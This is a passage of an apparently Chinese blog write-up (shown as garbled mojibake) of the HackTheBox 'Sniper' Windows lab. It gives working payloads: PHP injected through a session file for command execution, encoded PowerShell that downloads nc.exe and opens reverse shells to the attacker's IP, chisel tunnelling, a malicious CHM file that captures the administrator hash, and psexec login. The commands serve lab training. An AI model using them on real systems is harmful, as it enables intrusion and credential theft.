2020-04-01 09:20 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.151</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Sniper Co.</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 7h02m38s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-04-01T08:23:29</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯ä¸€å°windowsé¶æœºï¼Œé…æœ‰IISæœåŠ¡ã€‚ä¸è¿‡å¼€å¯çš„å‡ ä¸ªç«¯å£ä¸­åŒ…å«äº†445ç«¯å£,è¿™æ˜¯SMBæœåŠ¡å¼€æ”¾çš„ç«¯å£ã€‚</p><blockquote><p>port 445: Microsoft Windows SMB Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</p></blockquote><p>è‘—åçš„æ°¸æ’ä¹‹è“æ¼æ´ä¹Ÿæ˜¯é€šè¿‡è¿™ä¸€ç«¯å£åˆ©ç”¨çš„ã€‚å½“ç„¶è¿™é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆæ¸—é€ç‚¹ï¼Œåªæ˜¯è¯´æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡smbserverè¿æ¥åˆ°é¶æœº,å°è¯•åŸºæœ¬çš„smbè¿æ¥çš„è¯å‘ç°å¿…ç„¶æ˜¯è¦å¯†ç çš„ã€‚</p><p>é‚£ä¹ˆè¿˜æ˜¯ä»80ç«¯å£å…¥æ‰‹ã€‚è®¿é—®ç½‘é¡µï¼Œå‘ç°æ˜¯phpç½‘é¡µã€‚IIS+phpå®é™…ä¸Šæ˜¯éå¸¸å¥‡æ€ªçš„é…ç½®,ä½†æˆ‘ä»¬æ˜¾ç„¶å¯ä»¥ä»¥æ­¤ä¸ºå…¥æ‰‹ç‚¹ã€‚</p><h2 id="LFI-RFI-gt-å‘½ä»¤æ‰§è¡Œ-gt-webshell"><a href="#LFI-RFI-gt-å‘½ä»¤æ‰§è¡Œ-gt-webshell" class="headerlink" title="LFI/RFI=&gt;å‘½ä»¤æ‰§è¡Œ=&gt;webshell"></a>LFI/RFI=&gt;å‘½ä»¤æ‰§è¡Œ=&gt;webshell</h2><p>é¦–å…ˆåœ¨blogä¸‹å‘ç°ä¸€ä¸ªè¯­è¨€åˆ‡æ¢åŠŸèƒ½ï¼Œå…¶å‚æ•°å¯ä»¥æ–‡ä»¶åŒ…å«ã€‚<code>/blog?lang=blog-en.php</code><br>å°è¯•ä¼ªåè®®ç­‰å¸¸è§„å¥—è·¯è¯»æºç å‡ä»¥å¤±è´¥å‘Šç»ˆã€‚<br>ç®€å•è¯»windowsçš„æ–‡ä»¶<code>?lang=/windows/system32/license.rtf</code><br>å‘ç°æœ‰å›æ˜¾ã€‚é‚£ä¹ˆç°åœ¨ç›®çš„æ˜¯å¾—åˆ°ä¸€ä¸ªweb-rootçš„shellï¼Œå¦‚ä½•æ“ä½œå‘¢ï¼Ÿ<br>æ­¤æ—¶æœ‰ä¸€ç§ç›¸å¯¹â€ç®€å•â€çš„åŠæ³•,åˆ©ç”¨ä¸Šé¢æåˆ°çš„æ˜¯smbæœåŠ¡ã€‚æˆ‘ä»¬å†æœ¬æœºkaliæ–°å»ºä¸€ä¸ªsmbæœåŠ¡ï¼Œç„¶åç›´æ¥rfiè¿›è¡Œæ“ä½œã€‚<br>RFIçš„åŸºæœ¬æ“ä½œå¥—è·¯å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?lang&#x3D;\\10.10.14.62\share\foo.php</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯éœ€è¦æ³¨æ„ã€‚æƒ³é€šè¿‡SMBè¾¾æˆrfiæˆ‘ä»¬å¿…é¡»ä¿®æ”¹æœ¬æœºçš„æ˜¯smbæœåŠ¡çš„æƒé™,æ§åˆ¶æ–‡ä»¶å¤¹çš„æƒé™ä¸º777ç­‰ç­‰ï¼Œæ“ä½œèµ·æ¥å¯¹æˆ‘è¿™æ ·çš„å°ç™½è€Œè¨€ç›¸å¯¹å›°éš¾äº†ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•å¾—åˆ°webshellå‘¢?</p><p>æœ‰,è€Œè¿™ä¹Ÿæ˜¯æˆ‘å­¦åˆ°çš„ä¸åŒäºå¸¸è§„å¥—è·¯çš„æ–¹æ³•ã€‚<br>å›åˆ°ä¹‹å‰phpç½‘é¡µçš„æ€è·¯ä¸Šã€‚æœ‰è¿™æ ·çš„ä¸€ä¸ªç»†èŠ‚å¯ä»¥æ³¨æ„ï¼šè¿™æ˜¯ä¸€ä¸ªwindowsé¶æœºçš„phpæœåŠ¡ï¼Œå…¶sessionå€¼è¢«å­˜å‚¨åœ¨å›ºå®šçš„æ–‡ä»¶å¤¹äº†ã€‚<br>æˆ‘ä»¬å°è¯•ä¸€ä¸‹éšæ„æ³¨å†Œä¸€ä¸ªç”¨æˆ·åï¼Œå¹¶ä¸”è®°å½•ä¸‹sessionå€¼ã€‚é€šè¿‡ä¸‹é¢çš„payloadåŒ…å«session</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lang&#x3D;&#x2F;Windows&#x2F;Temp&#x2F;sess_1d6bfk00vc159thng1t5q521qg</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æŸ¥çœ‹åŒ…å«çš„ç»“æœï¼Œå‘ç°æ˜¯å«æœ‰ç”¨æˆ·åçš„åºåˆ—åŒ–æ•°æ®ã€‚é‚£ä¹ˆç±»ä¼¼äºä¹‹å‰tp5çš„sessionå›ºå®šå­˜å‚¨ç±»çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿™é‡Œä¸‹æ‰‹ï¼Œå°†phpä»£ç å†™å…¥sessionæ•°æ®ã€‚</p><p>é¦–å…ˆå°è¯•ç®€å•çš„fuzz,å‘ç°ç”¨æˆ·åè¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ã€‚è¿™é‡Œç›´æ¥ç»™å‡ºå¯è¡Œçš„payloadåŠå›æ˜¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`whoami`<span class="meta">?&gt;</span></span><br><span class="line">lang=/Windows/Temp/sess_1d6bfk00vc159thng1t5q521qg</span><br><span class="line">username|s:<span class="number">13</span>:<span class="string">"nt authority\iusr</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨çŸ­æ ‡ç­¾åŠ åå¼•å·ç›´æ¥æ‰§è¡Œå‘½ä»¤ã€‚å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œwhoamiã€‚<br>æ¥ä¸‹æ¥å¯ä»¥å†™webshell,ä¹Ÿå¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œã€‚è¿™é‡Œç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>å°è¯•å¸¸è§„çš„powershellåå¼¹shellå¤±è´¥ã€‚ä¹‹åä¼šå‘ç°å¯èƒ½æ˜¯å› ä¸ºpowershellè¿è¡Œåœ¨constraintmodeçš„åŸå› ã€‚ä½†æ˜¯ä¸è¦ç´§ï¼Œåˆ©ç”¨lfi+å‘½ä»¤æ‰§è¡Œæˆ‘ä»¬è¿˜æœ‰å…¶ä»–æ–¹æ³•æ‹¿åˆ°windowsé¶æœºçš„shellã€‚<br>é¦–å…ˆæ‰¾åˆ°æœ¬æœºçš„netcat(å³å¹³æ—¶ä½¿ç”¨çš„nc),æŠŠå®ƒä¼ åˆ°windowsæœºä¸Šã€‚(å½“ç„¶éœ€è¦å…ˆå»ºå¥½wwwæ–‡ä»¶å¤¹,å¹¶æŠŠæœ¬æœºçš„nc.exeå¤åˆ¶åˆ°é‡Œé¢)<br>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'wget 10.10.15.189/nc.exe -O \windows\temp\exp.exe'</span> | iconv -t utf-16le | base64 -w 0</span><br></pre></td></tr></table></figure><p>å°†å‡†å¤‡å¥½çš„payloadè¿›è¡Œç¼–ç é¿å…è¿‡æ»¤ã€‚<br>æ³¨å†Œæ–°ç”¨æˆ·åä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`powershell /enc &#123;your encoded  command &#125;`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨/encæ˜¯powershellå¯¹åº”çš„è§£ç flag,æ²¡ä½¿ç”¨-encæ˜¯ä¸ºäº†è§£å†³è¿‡æ»¤é—®é¢˜ã€‚<br>ç„¶ååŒ…å«å¯¹åº”çš„ç”¨æˆ·çš„sessionå³å¯æ‰§è¡Œã€‚<br>å†åˆ©ç”¨lfiæ£€æŸ¥æ˜¯å¦å·²ç»æŠŠncä¼ ä¸Šå»äº†<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¾ˆå¥½ã€‚é‚£ä¹ˆå†è¿›è¡Œåå¼¹shellçš„å‘½ä»¤å§ã€‚<br>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'c:\windows\temp\exp.exe 10.10.15.189 8899 -e powershell'</span> | iconv -t utf-16le | base64 -w 0</span><br></pre></td></tr></table></figure><p>æœ¬æœºç›‘å¬8899.æµè§ˆå™¨åŒ…å«,å¹¶å¾—åˆ°webshell</p><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="user-shell"><a href="#user-shell" class="headerlink" title="user shell"></a>user shell</h2><p>æ‹¿åˆ°webshellåæˆ‘ä»¬é¦–å…ˆæ£€æŸ¥ä¸‹æºç ã€‚å¾ˆå¿«å°±æœ‰æ‰€å‘ç°<br>\user\db.phpä¸­å¯ä»¥å‘ç°ä¸€ä¸ªæ•°æ®åº“çš„å¯†ç <code>36mEAhz/B8xQ~2VM</code>.è€Œä¸”åœ¨Userä¸­å¯ä»¥å‘ç°ç”¨æˆ·Chrisçš„å­˜åœ¨ã€‚<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä¸‹é¢å°è¯•æ‹¿åˆ°usershell.<br>è¿™é‡Œå°†å†æ¬¡ç”¨åˆ°æˆ‘ä»¬ä¹‹å‰ä½¿ç”¨è¿‡çš„ç«¯å£è½¬å‘ã€‚ä¸è¿‡éœ€è¦ä¸€ä¸ªå·¥å…·æ¥å¸®åŠ©æˆ‘ä»¬å®ç°ã€‚<br><a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">https://github.com/jpillora/chisel</a><br>ä»githubreleaseå¤„ä¸‹è½½chiselçš„linuxä¸windowsç‰ˆæœ¬ã€‚åˆ†åˆ«ç”¨äºæœ¬æœºä¸é¶æœºã€‚ç„¶åwgetæŠŠwindowsç‰ˆæœ¬çš„ä¼ è¾“åˆ°é¶æœºä¸Šã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali: chmod +x chisel_linux_amd64</span><br><span class="line">./chisel_linux_amd64 server -p 8000 --reverse</span><br><span class="line"></span><br><span class="line">shell: wget http://10.10.15.189/chisel.exe -O chisel.exe</span><br><span class="line"></span><br><span class="line">portforwarding: .\chisel.exe client 10.10.15.189:8000 R:5985:127.0.0.1:5985 R:3306:127.0.0.1:3306</span><br></pre></td></tr></table></figure><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¼€å¯<code>--reverse</code>å…è®¸æˆ‘ä»¬è½¬å‘ç«¯å£ã€‚è€Œæœ€åä¸€æ­¥æˆ‘ä»¬æŠŠ5985ä¸3306ç«¯å£è½¬å‘åˆ°æœ¬åœ°ã€‚5985å¯¹åº”çš„æ˜¯WinRMæœåŠ¡ï¼Œå¯ç”¨äºè¿œç¨‹ç®¡ç†ã€‚æˆ‘ä»¬æŠŠå®ƒè½¬å‘åˆ°æœ¬åœ°åï¼Œå¯ä»¥åˆ©ç”¨å¦ä¸€ä¸ªæ¸—é€å·¥å…·evil-winrmè¿›è¡Œç”¨æˆ·ç™»å½•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Hackplayers/evil-winrm</span><br><span class="line">sudo gem install winrm winrm-fs stringio</span><br></pre></td></tr></table></figure><p>åªéœ€ä¸¤æ­¥å³å¯ä½¿ç”¨ã€‚<br>ç„¶åevil-winrmç»§ç»­ç™»å½•ï¼Œç›´æ¥æœ¬åœ°127.0.0.1å³å¯ã€‚å› ä¸ºæˆ‘ä»¬ç«¯å£å·²ç»è½¬å‘å¥½äº†ã€‚<br><code>./evil-winrm.rb -u chris -p &#39;36mEAhz/B8xQ~2VM&#39; -i 127.0.0.1</code><br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ‹¿åˆ°usershell.</p><p>ä¹‹æ‰€ä»¥ç”¨è¿™ä¹ˆå¤šå·¥å…·è¿›è¡Œuserçš„ææƒå…¶å®æ˜¯å› ä¸ºè¿™é‡Œæƒ³è¦é€šè¿‡å…¶ä»–æ–¹æ³•å¾—åˆ°usershellè¦å†æ¬¡åå¼¹shell.<br>å¹¶ä¸”æ“ä½œèµ·æ¥æœ‰ç‚¹éº»çƒ¦.è¿™é‡Œæˆ‘ç®€å•æä¸€ä¸‹ï¼Œå°±æ˜¯ç›´æ¥é€šè¿‡powershellå‘½ä»¤åˆ›å»ºä¸€ä¸ªå±äºChrisçš„å˜é‡ï¼Œç„¶åå†åå¼¹shell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = convertto-securestring <span class="string">'36mEAhz/B8xQ~2VM'</span> -asplaintext -force</span><br><span class="line"><span class="variable">$cred</span> = new-object system.management.automation.pscredential(<span class="string">"sniper\chris"</span>, <span class="variable">$pass</span>)</span><br><span class="line">invoke-command -computer sniper -scriptblock &#123; whoami &#125; -credential <span class="variable">$cred</span></span><br></pre></td></tr></table></figure><p>å˜é‡æˆåŠŸåˆ›å»ºçš„è¯ï¼Œæœ€åä¸€æ¡å‘½ä»¤çš„å›æ˜¾åº”è¯¥æ˜¯<code>sniper\chris</code><br>ç„¶åä¸‹é¢çš„å‘½ä»¤å¯ä»¥é‡æ–°å¼¹shellï¼Œå¾—åˆ°usershell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-command -computer sniper -scriptblock &#123; c:\windows\temp\exp.exe 10.10.15.189 1234 -e powershell.exe &#125; -credential <span class="variable">$cred</span></span><br></pre></td></tr></table></figure><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><p>é‚£ä¹ˆåˆåˆ°äº†æœ€åçš„rootææƒæ—¶é—´ã€‚<br>åœ¨C:\docsä¸­å¯ä»¥å‘ç°è¿™æ ·ä¸€ä¸ªæœ‰è¶£çš„txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hi Chris,</span><br><span class="line">Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it.</span><br><span class="line">And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.</span><br><span class="line">Regards,</span><br><span class="line">Sniper CEO.</span><br></pre></td></tr></table></figure><p>æœ‰æ„æ€ã€‚ä¼¼ä¹åœ¨æç¤ºæˆ‘ä»¬,ä¼ åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„ä¸œè¥¿å¯èƒ½ä¼šè¢«CEOæ£€æµ‹ã€‚è¿™ä¹Ÿå°±ç±»ä¼¼xssä¸­æˆ‘ä»¬çš„payloadè¢«æ£€æŸ¥æ—¶å¯ä»¥æ‰“åˆ°adminçš„cookie.è¿™é‡Œæˆ‘ä»¬æ˜¯å¦ä¹Ÿèƒ½é€šè¿‡å¯æ‰§è¡Œæ–‡ä»¶è®©administratoræ£€æŸ¥,æ‹¿åˆ°administratorçš„æƒé™å‘¢ï¼Ÿ<br>åŒæ ·åœ¨Chrisçš„Downloadsç›®å½•ä¸‹æˆ‘ä»¬å‘ç°ä¸€ä¸ªinstructions.chmæ–‡ä»¶ã€‚æ‹¿åˆ°windowsæœ¬æœºæ‰“å¼€,å°†å‘ç°<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.5.PNG" class="lazyload" data-srcset="4.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å°±æ˜¯è¦ä½¿ç”¨chmæ–‡ä»¶è¿›è¡Œæ“ä½œäº†ã€‚åŒæ—¶åˆ©ç”¨çš„æ€è·¯ä¹Ÿå¤§è‡´æ¸…æ¥šäº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.windowsæœ¬æœºä¸‹æ“ä½œç”Ÿæˆchmæ–‡ä»¶</span><br><span class="line">2.ä¸Šä¼ chmæ–‡ä»¶,å…¶ä¸­payloadå°†æ‰“åˆ°æœ¬æœº #ç±»ä¼¼xssçš„é“ç†</span><br><span class="line">3.ç›‘å¬æœ¬æœºï¼Œå¾—åˆ°administratorä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><p>ç®€å•æä¸‹chmæ–‡ä»¶ã€‚å…¶å®å°±æ˜¯htmlæ–‡ä»¶çš„å¸®åŠ©æ–‡ä»¶ç³»ç»Ÿã€‚è€Œä¸”æƒ³è¦æ“ä½œèµ·æ¥å¾ˆç®€å•,åªè¦åœ¨win10ç”µè„‘çš„<code>C:\Program Files (x86)\HTML Help Workshop</code>ä¸­å³å¯æ‰¾åˆ°ã€‚<br>å½“ç„¶æˆ‘ä»¬è¿˜è¦ä»å¾®è½¯å®˜ç½‘ä¸‹è½½æœ€æ–°çš„<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=21138</a><br>å…ˆåˆ›å»ºä¸€ä¸ªhtmlæ–‡ä»¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hacked by byc_404&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src=\\10.10.15.189\htb\23333.jpg/</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><p>é‡Œé¢çš„srcèµ„æºæŒ‡å‘æˆ‘ä»¬æœ¬æœºä»»æ„èµ„æºï¼Œè¯´ç™½äº†å°±æ˜¯è®©adminè§¦å‘ä¸”æˆ‘ä»¬èƒ½æ”¶åˆ°è¯·æ±‚è€Œå·²ã€‚<br>åœ¨windowsæœ¬æœºä»¥ç®¡ç†å‘˜æƒé™æ‰“å¼€hhw.exeï¼Œåˆ›å»ºtest.hppé¡¹ç›®æ·»åŠ æˆ‘ä»¬åˆšåˆšçš„index.htmlå¹¶ç¼–è¯‘ï¼Œå³å¯ç”Ÿæˆä¸€ä¸ªchmæ–‡ä»¶ã€‚<br>ç„¶åå›åˆ°æœ¬æœº,å…ˆèµ·ä¸€ä¸ªç›‘å¬<br><code>responder -I tun0</code></p><p>wgetä¸Šä¼ æ–‡ä»¶åˆ°docsæ–‡ä»¶å¤¹ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.15.189/test.chm -O exp.chm</span><br></pre></td></tr></table></figure><p>å¾ˆå¿«å°±èƒ½æ”¶åˆ°è¯·æ±‚<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™æ˜¯ä¸€ä¸²ç®¡ç†å‘˜å¯†ç çš„hash.åˆ°ç½‘ç«™ä¸Šè§£ç å¯å¾—ç®¡ç†å‘˜å¯†ç <code>butterfly!#1</code>.</p><p>ç„¶åç™»å°è¯•ç™»é™†ã€‚ç”±äºå¼€æ”¾äº†445ç«¯å£ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨smbæœåŠ¡å¯ä»¥ç›´æ¥ç™»å½•ã€‚<br>å½“ç„¶æˆ‘æ²¡æœ‰èµ·smbæœåŠ¡ï¼Œä½¿ç”¨ä¸‹é¢githubä¸Šçš„pythonè„šæœ¬å³å¯æ›¿ä»£ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket   </span><br><span class="line">pip install .</span><br><span class="line">python psexec.py Administrator@10.10.10.151</span><br></pre></td></tr></table></figure><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æˆåŠŸæ‹¿åˆ°rootshell.</p><p>å½“ç„¶è¿˜æœ‰ç±»ä¼¼å‰é¢çš„ç›´æ¥åå¼¹rootshellçš„æ–¹æ³•ã€‚å› ä¸ºchmæ–‡ä»¶ç”šè‡³å¯ä»¥æ’å…¥powershellå‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”Ÿæˆåå¼¹shellçš„html.è¿™é‡Œç›´æ¥å€Ÿç”¨çœ‹åˆ°çš„dalaoçš„chmã€‚<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æˆ–è€…ä½¿ç”¨powershellå‘½ä»¤ç”Ÿæˆpayload<br><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Out-CHM â€“Payload <span class="string">"C:windows\temp\exp.exe 10.10.15.189 6666 -e powershell.exe"</span> â€“HHCPath â€œC:\Program Files (x86)\HTML Help Workshopâ€</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½ç›´æ¥åœ¨administratoræ£€æŸ¥æ—¶åå¼¹åˆ°shell.</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™æ¬¡windowsé¶æœºçš„ä½“éªŒè¿˜ç®—ä¸é”™ã€‚å› ä¸ºä¸ç†Ÿæ‚‰çš„åŸå› æ¥è§¦äº†ä¸å°‘æ–°çŸ¥è¯†ã€‚æœ‰å¾ˆå¤šç»†èŠ‚è¿˜æ²¡å¼„æ˜ç™½ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘windowsé¶æœºæ–°çŸ¥è¯†ã€‚çš„ç¡®ï¼ŒCTFer 